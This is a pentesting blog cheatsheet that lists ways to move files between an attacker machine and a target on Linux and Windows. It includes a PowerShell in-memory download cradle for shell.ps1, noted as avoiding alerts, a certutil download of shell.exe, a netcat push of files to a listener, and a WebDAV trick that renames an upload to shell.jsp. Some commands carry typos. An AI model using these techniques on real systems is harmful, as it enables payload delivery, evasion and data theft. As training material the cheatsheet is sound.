---
layout: post
title: "Cheatsheets: File Transfers 101"
date: 2022-07-30 23:32 +0100
tags: pentesting windows linux kali cheatsheet
categories: [Cheatsheets]
published: true
---

There is more than one way to skin a cat, and there is more than one way to transfer a file.

Just because one method doesn't work, doens't mean another one won't.

Try Harder™

## Hasing and Verifying Files

Before you transfer a file, it's always best to know what it is you're actually transferring, mostly so you'll know if it gets corrupted during the transfer. But also becuse reading files in a terminal makes you feel like a proper hacker.

```bash
# Read a file
cat /path/to/file

# Read the file headers
xxd /path/to/file | head -c 1024

# Have Linux guess at the file type (from the file header)
file /path/to/file

# Get a SHA256 hash
sha265sum /path/to/file

# Get an MD5 hash
md5sum /path/to/file
```

## One file > Many files

If it's possible, archive whatever it is you need to upload/download.

Sometimes it's not really feasible but it's something that should be considered, for multiple reasons.

- It's a smaller file
- It won't match any stored file hashes if your adversary uses such monitoring
- One file is easier to transfer than 10
- You can serialize the contents of an archive for text based extraction if that's all you have

```bash
# Create a new tarball
tar czvf NameOfTarBall.tgz /path/to/archive

# Extract tarball
tar xvf NameOfTarBall.tgz

# Serialize a tarball
cat NameOfTarBall.tgz | base64 -w 0

# Recover tarball from serialized data
echo "<BASE64_STRING>" | base64 -d > recovered.tgz
```

## BASH (command line tools)

```bash
wget <path to file> -O <filename>
curl <path to file> --output <filename>

# Copy a file from a target to our host
scp user@host:/path/to/file /path/to/destination

# Copy a file from our host to a target
scp /path/to/file user@host:/path/to/destination

# Copy a whole directory from our host to a target
scp -r /path/to/directory user@host:/path/to/destination

```

We can use a netcat listener and STDOUT to write raw input to files:

```bash
# setup a listener where "someFile" is the file you want to write
# this will sit and wait for the connection, so set it up first
nc -lvnp 1337 > someFile

# On the target
nc 10.10.14.4 1337 < someFile
```

You'll have no real way to tell when the transfer is done using the above `nc` method, so don't hit Ctrl-C until you're sure that everything copied across, and be sure to check the file size and run `file` and/or `sha256sum` to verify the integrity of the file (it can get trashed using this method)

## FTP

### Connect

```bash
ftp domain.com
ftp 192.168.0.1
ftp user@ftpdomain.com
```

### Log in

```bash
Name: anonymous
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

### Move around

```bash
ftp> ls
ftp> cd directory
```

### Grab files

```bash
get file
```

### Send files

```bash
put file
```

## Python

### With Requests

`pip install requests`

```python
import requests

url = 'https://www.python.org/static/img/python-logo@2x.png'
myfile = requests.get(url)
open('/path/to/save/image.png', 'wb').write(myfile.content)
```

### With wget

`pip install wget`

```python
import wget

url = "https://www.python.org/static/img/python-logo@2x.png"
wget.download(url, '/path/to/save/image.png')
```

### With urllib

*should already be installed, but...* `pip install urllib`

```python
urllib.request.urlretrieve('url', 'path')
```

With urllib3

`pip install urllib3`

```python
import urllib3, shutil

url = 'https://www.python.org/'
c = urllib3.PoolManager()
filename = "test.txt"
with c.request('GET', url, preload_content=False) as res, open(filename, 'wb') as out_file:
    shutil.copyfileobj(res, out_file)
```

## Powershell

In-memory download cradle *handy for pentesting as nothing gets written to disk so there is less chance of triggering a related alert*

```bash
IEX(New-Object Net.WebClient)downloadString('http://10.10.14.4/shell.ps1')
```

### Standard Web Request

```bash
iwr ‘http://10.10.14.4/shell.ps1’ -Outfile C:\Windows\temp\shell.ps1

Invoke-WebRequest -Url http://10.10.14.4/shell.ps1 -Outfile C:\Windows\temp\shell.ps1
```

## SMB

### Standard SMB

1. Modify /etc/samba/smbd.conf. Add the following to the bottom:

```bash
[global]
workgroup = WORKGROUP
server string = Samba Server %v
netbios name = tengu
security = user
map to guest = bad user
name resolve order = bcast host
dns proxy = no
bind interfaces only = yes

[gorilla]
path = /var/www/html/pub
writable = no
guest ok = yes
guest only = yes
read only = yes
directory mode = 0555
force user = nobody
```

### Set folder permissions

```bash
chmod 0555 /var/www/html/pub
chown -R nobody:nogroup /var/www/html/pub

```

### Restart Samba

```bash
service smbd start
service smdb stop
service smbd restart

```

### Monitor logs for errors

```bash
tail -f /var/log/samba/log.<site-name>
```

## Impacket SMB

```bash
impacket-smbserver -ip 10.10.14.4 -smb2support bullsec /var/www/html/pub
```

Then use `\\10.10.14.4\bullsec\<file-name>` as the location to send your file from, or to have the target grab from you.

Mounting a remote share is pretty simple as well assuming you know the name of the share:

```bash
mkdir /mnt/10.10.10.123
mount -t cifs //10.10.10.123/general /mnt/10.10.10.123

```

Now we can browse the share inside our terminal.

### Impacket SMB w/ Password

```bash
# Create the SMB Share
impacket-smbserver bullShare $(pwd) -smb2support -user bullsec -password SecurePassword
```

```powershell
# Create a Credential Object
$pass = convertto-securestring 'SecurePassword' -asplain -force
$cred = new-object system.management.automation.pscredential("htb\bullsec", $pass)
```

```powershell
# Connect to the Share
New-PSDrive -Name bullsec -PSProvider FileSystem -Credential $cred -Root \\10.10.14.3\bullShare
```

```powershell
# Browse the Share
cd bullShare:
```

## certutil

Genuinely forget that this is a thing most of the time but it's such a useful tool. If you're on a Windows machine then this may be a viable option for transferring files from our host system to the target:

```bash
certutil -urlcache -f “http://10.10.14.14/shell.exe” shell.exe
```

That's it really.

It might not always be a thing, but on older Windows machines it should be present.

## TFTP

Trivial File Transfer Protocol is a nice way to get around file transfers on Windows assuming it's installed on the sytem. It's basically FTP but it runs on UDP instead of TCP.

```bash
service atftpd start
```

On Kali by default TFTP is configured from the following location:

`/etc/default/atftpd`

And it serves files (by default) from:

`/srv/tftp`

To download files from a server we can do:

```bash
tftp -i host GET C:%homepath%file location_of_file_on_tftp_server
```

And to upload a file to the server we can do:

```bash
tftp -i host PUT C:%homepath%file location_of_file_on_tftp_server
```

## SFTP

[How To Use SFTP to Securely Transfer Files with a Remote Server](https://www.digitalocean.com/community/tutorials/how-to-use-sftp-to-securely-transfer-files-with-a-remote-server)

## VisualBasic

If push comes to shove, we can use something like the following:

```bash
Set args = Wscript.Arguments 
Url = "http://domain/file" dim xHttp: 
Set xHttp = createobject("Microsoft.XMLHTTP") dim bStrm: 
Set bStrm = createobject("Adodb.Stream") 
xHttp.Open "GET", Url, False xHttp.Send with bStrm     
.type = 1 '     
.open     
.write xHttp.responseBody     
.savetofile " C:%homepath%file", 2 ' end with
```

## WebDAV

We can sometimes use WebDAV to upload files to a system.

If it's enabled use a tool like cadaver to PUT a file onto the server, usually there are some restrictions on file uploads/execution, bu it doesn't recheck the file after the initial upload, so just use the mv command to change the extension.

```bash
$> cadaver http://192.168.56.5

put shell.jsp.txt
mv shell.jsp.txt shell.jsp
```
